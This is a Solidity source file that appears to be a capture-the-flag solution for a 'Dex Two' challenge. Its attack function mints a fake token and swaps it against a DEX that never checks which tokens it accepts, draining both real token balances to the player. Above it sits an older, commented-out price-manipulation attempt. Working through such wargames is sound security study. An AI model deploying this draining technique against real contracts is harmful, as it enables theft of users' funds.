// SPDX-License-Identifier: MIT

pragma solidity^0.8.0;

import {DexTwo, SwappableTokenTwo} from "./dex2.sol";

contract attackContract {
    DexTwo target;
    constructor(DexTwo _target){
        target = _target;
    }

    // function attack() public{
    //     SwappableTokenTwo token3 = new SwappableTokenTwo(address(target), "token3", "t3", 100);

    //     target.approve(address(target), 1000);
    //     token3.approve(address(this), address(target), 2000);
    //     address t1 = target.token1();
    //     address t2 = target.token2(); 
    //     address t3 = address(token3);

    //     target.swap(t1, t3, 10);
    //     target.swap(t3, t1, 20);
    //     target.swap(t1, t3, 24);
    //     target.swap(t3, t1, 30);
    //     target.swap(t1, t3, 41);
    //     target.swap(t3, t1, 45);

    //     SwappableTokenTwo token4 = new SwappableTokenTwo(address(target), "token4", "t4", 100);
    //     token4.approve(address(this), address(target), 1000);
    //     address t4 = address(token4);
    //     target.swap(t2, t4, 10);
    //     target.swap(t4, t2, 20);
    //     target.swap(t2, t4, 24);
    //     target.swap(t4, t2, 30);
    //     target.swap(t2, t4, 41);
    //     target.swap(t4, t2, 45);

    // }

    function attack(address player) public {
    SwappableTokenTwo fake = new SwappableTokenTwo(address(target), "fake", "FK", 4);
    fake.approve(address(this), address(target), type(uint256).max); //approves address(this) owned tokens to be spent by target address

    address t1 = target.token1();
    address t2 = target.token2();

    fake.transfer(address(target), 1);
    target.swap(address(fake), t1, 1);
    target.swap(address(fake), t2, 2);

    SwappableTokenTwo(t1).transfer(player, 100);
    SwappableTokenTwo(t2).transfer(player, 100);
    }
}
